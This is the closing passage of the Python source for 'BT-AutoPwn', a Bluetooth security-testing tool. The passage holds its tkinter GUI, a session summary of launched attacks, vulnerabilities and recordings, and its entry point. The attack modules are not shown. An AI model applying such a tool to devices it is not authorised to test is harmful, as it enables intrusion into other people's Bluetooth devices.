        os.system(f"xdg-open {LOG_DIR} 2>/dev/null || thunar {LOG_DIR} 2>/dev/null &")

    def do_export_html():
        if not devices:
            SESSION.warn("Aucun appareil à inclure dans le rapport"); return
        path = export_html_report(devices, atk_results)
        export_status.set(f"Rapport HTML:\n  {path}")
        os.system(f"xdg-open '{path}' 2>/dev/null &")

    make_btn(sess_inner, "⬡  Exporter session complète (JSON + TXT + CSV)", do_export,      ACC,      4)
    make_btn(sess_inner, "⎙  Générer rapport HTML  (ouvre dans navigateur)",  do_export_html, ACC2,     3)
    make_btn(sess_inner, "⌂  Ouvrir dossier logs",                            do_open_logs,   "#888899",2)
    make_btn(sess_inner, "✕  Effacer console",                                do_clear_log,   "#553333",2)

    tk.Label(sess_inner, textvariable=export_status, font=FONT_SMALL,
             fg=ACC, bg=BG, justify=tk.LEFT).pack(anchor=tk.W, pady=8)

    # Session summary
    make_section_label(sess_inner, "RÉSUMÉ")
    sess_summary = tk.Text(sess_inner, bg=BG2, fg=FG, font=FONT_SMALL,
                           height=10, state="disabled", relief=tk.FLAT, bd=0)
    sess_summary.pack(fill=tk.X)

    def refresh_summary():
        sess_summary.configure(state="normal"); sess_summary.delete("1.0", tk.END)
        total_vulns = sum(len(d.vulnerabilities) for d in devices)
        crit_count  = sum(1 for d in devices
                          for p in classify_services(d.services)
                          if p in VULN_DB and VULN_DB[p]["severity"] == "CRITICAL")
        scores      = [risk_score(d) for d in devices]
        n_crit_risk = sum(1 for s in scores if s >= 75)
        max_score   = max(scores) if scores else 0
        total_atks  = sum(len(v) for v in atk_results.values())

        lines = [
            ("  Appareils détectés:  ", str(len(devices)),            "normal"),
            ("  Attaques lancées:    ", str(total_atks),              "normal"),
            ("  Événements log:      ", str(len(SESSION.entries)),    "normal"),
            ("  Enregistrements BT:  ", str(len(_rec_procs)),         "normal"),
            ("  Dossier logs:        ", LOG_DIR,                      "dim"),
            ("  Total vulns:         ", str(total_vulns),             "warn" if total_vulns else "normal"),
            ("  Risque critique:     ", f"{n_crit_risk} appareil(s) ≥75/100","crit" if n_crit_risk else "normal"),
            ("  Score max détecté:   ", f"{max_score}/100",           "crit" if max_score>=75 else "warn" if max_score>=50 else "normal"),
            ("  Critiques (CRITICAL):", str(crit_count),              "crit" if crit_count else "normal"),
        ]
        sess_summary.tag_config("key",    foreground="#666688")
        sess_summary.tag_config("normal", foreground=FG)
        sess_summary.tag_config("warn",   foreground=WARN)
        sess_summary.tag_config("crit",   foreground=ERRR)
        sess_summary.tag_config("dim",    foreground="#444455")
        for key, val, tag in lines:
            sess_summary.insert(tk.END, key, "key")
            sess_summary.insert(tk.END, val + "\n", tag)

        if devices:
            sess_summary.insert(tk.END, "\n  Scores par appareil:\n", "key")
            for d in devices:
                sc  = risk_score(d)
                col = "crit" if sc>=75 else "warn" if sc>=50 else "normal"
                sess_summary.insert(tk.END, f"    {d.mac}  {d.name[:20]:<20}  ", "dim")
                sess_summary.insert(tk.END, f"{sc:3d}/100\n", col)

        sess_summary.configure(state="disabled")
        root.after(3000, refresh_summary)

    # ── Poll queue → write to terminal ──
    def poll():
        try:
            while True: write_log(gui_q.get_nowait())
        except Empty: pass
        root.after(80, poll)

    # ── Status bar update ──
    def update_status():
        t = datetime.now().strftime("%H:%M:%S")
        n_dev = len(devices)
        n_log = len(SESSION.entries)
        primary = ADAPTERS.primary or "?"
        status_var.set(f"{t}  ·  {n_dev} appareil(s)  ·  {n_log} log entries  ·  {primary}")
        root.after(1000, update_status)

    # ── Init ── scan adapters if not already done (direct run_gui() call)
    if not ADAPTERS.adapters:
        ADAPTERS.scan()
    refresh_adapter_panel()
    refresh_iface_hints()
    for iface in ADAPTERS.adapters:
        ADAPTERS.up(iface)
    SESSION.success(f"BT-AutoPwn v{VERSION} prêt — GUI")
    refresh_summary()
    update_target_display()
    update_status()
    root.after(80, poll)
    root.mainloop()

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 12 — ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    require_root()

    parser = argparse.ArgumentParser(
        description=f"BT-AutoPwn v{VERSION} — Bluetooth Security Testing Framework"
    )
    parser.add_argument("--gui",   action="store_true", help="Mode GUI (tkinter)")
    parser.add_argument("--cli",   action="store_true", help="Mode CLI (rich TUI)")
    args = parser.parse_args()

    # Dependency check
    missing = _dep_check()
    if missing:
        console.print("[yellow]⚠ Dépendances manquantes:[/yellow]")
        for tool, pkg in missing:
            console.print(f"  [red]✗[/red] {tool} → apt install {pkg}")

    # Adapter scan
    console.print("[cyan]Scan des adaptateurs Bluetooth...[/cyan]")
    ADAPTERS.scan()

    if not ADAPTERS.adapters:
        console.print("[red]Aucun adaptateur BT détecté. Brancher les dongles et relancer.[/red]")
        sys.exit(1)

    # Mode selection
    if args.gui:  mode = "gui"
    elif args.cli: mode = "cli"
    else:
        print(f"\n  BT-AutoPwn v{VERSION}\n")
        for line in ADAPTERS.status_lines(): print(f"  {line}")
        print("\n  [1]  CLI  (terminal rich TUI)")
        print("  [2]  GUI  (interface graphique)\n")
        ch = input("  Choix [1/2]: ").strip()
        mode = "gui" if ch == "2" else "cli"

    if mode == "gui": run_gui()
    else:             run_cli()

if __name__ == "__main__":
    main()
